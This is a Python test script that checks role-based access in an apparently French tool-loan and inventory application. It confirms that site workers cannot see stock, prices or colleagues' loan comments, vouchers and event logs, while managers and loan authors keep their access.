check("QA-15: stock is refused to a site worker", client.get("/stock/items", headers=_wh).status_code == 403)
_item = client.post("/stock/items", headers=_mh2, json={"name": "Stock QA"}).json()
check("QA-15: stock movements are refused too", client.get(f"/stock/items/{_item['id']}/movements", headers=_wh).status_code == 403)
check("QA-15: a manager still reads the stock", client.get("/stock/items", headers=_mh2).status_code == 200)

_pr = client.post("/agency-tools", headers=_mh2, json={"name": "Prix QA", "unique_code": "SEC-QA-PRIX", "purchase_price": 900, "daily_rate": 12}).json()
_gl = next(t for t in client.get("/agency-tools", headers=_wh).json() if t["id"] == _pr["id"])
check("QA-16: a site worker gets no price in the list", _gl["purchase_price"] is None and _gl["daily_rate"] is None)
check("QA-16: nor on the tool sheet", client.get(f"/agency-tools/{_pr['id']}", headers=_wh).json()["purchase_price"] is None)
_xw = _load_wb_sec(_io_sec.BytesIO(client.get("/agency-tools/export", headers=_wh).content)).active
_xrow = next(row for row in _xw.iter_rows(values_only=True) if row[1] == "SEC-QA-PRIX")
check("QA-16: his export has no price", _xrow[8] is None)
_xm = _load_wb_sec(_io_sec.BytesIO(client.get("/agency-tools/export", headers=_mh2).content)).active
check("QA-16: a manager's export keeps it", next(row for row in _xm.iter_rows(values_only=True) if row[1] == "SEC-QA-PRIX")[8] == 900)
check("QA-16: a manager keeps the price", client.get(f"/agency-tools/{_pr['id']}", headers=_mh2).json()["purchase_price"] == 900)
_ctl = client.post(f"/agency-tools/{_pr['id']}/control", headers=_wh, json={"state": 4, "status": "disponible"})
check("QA-16: the control answer hides the price", _ctl.status_code == 200 and _ctl.json()["purchase_price"] is None)

_st = (_dt_sec.utcnow() + _td_sec(days=10)).isoformat()
_en = (_dt_sec.utcnow() + _td_sec(days=12)).isoformat()
_lo = client.post("/loans", headers=_mh2, json={"tool_id": _pr["id"], "start_datetime": _st, "end_datetime_planned": _en, "comment": "Note du responsable", "site": "Chantier QA"}).json()
_seen = next(l for l in client.get("/loans?scope=agency", headers=_wh).json() if l["id"] == _lo["id"])
check("QA-17: the calendar keeps tool, person, dates and site", _seen["tool_id"] == _pr["id"] and _seen["borrower_id"] == _lo["borrower_id"] and _seen["start_datetime"] and _seen["site"] == "Chantier QA")
check("QA-17: a colleague's comment is hidden", _seen["comment"] is None and _seen["has_signature"] is False)
check("QA-17: the author keeps his comment", next(l for l in client.get("/loans?scope=agency", headers=_mh2).json() if l["id"] == _lo["id"])["comment"] == "Note du responsable")
check("QA-17: a colleague's voucher is refused", client.get(f"/loans/{_lo['id']}/voucher.pdf", headers=_wh).status_code == 403)
check("QA-17: a colleague's event log is refused", client.get(f"/loans/{_lo['id']}/events", headers=_wh).status_code == 403)
_mine = client.post("/loans", headers=_wh, json={"tool_id": _pr["id"], "start_datetime": (_dt_sec.utcnow() + _td_sec(days=20)).isoformat(), "end_datetime_planned": (_dt_sec.utcnow() + _td_sec(days=21)).isoformat(), "comment": "Ma note"}).json()
check("QA-17: a worker keeps his own loan details", client.get(f"/loans/{_mine['id']}", headers=_wh).json()["comment"] == "Ma note" and client.get(f"/loans/{_mine['id']}/voucher.pdf", headers=_wh).status_code == 200)

_sum = client.get(f"/users/{_w15}/departure-summary", headers=_mh2).json()["reassignable"]
check("QA-19: the recap counts what would move", _sum == {"personal_tools": 0, "epi": 0, "dotations": 0})
client.post("/personal-tools", headers=_wh, json={"name": "Perso QA", "unique_code": "SEC-QA-PERSO"})
check("QA-19: it counts the tools held", client.get(f"/users/{_w15}/departure-summary", headers=_mh2).json()["reassignable"]["personal_tools"] == 1)
client.cookies.clear()
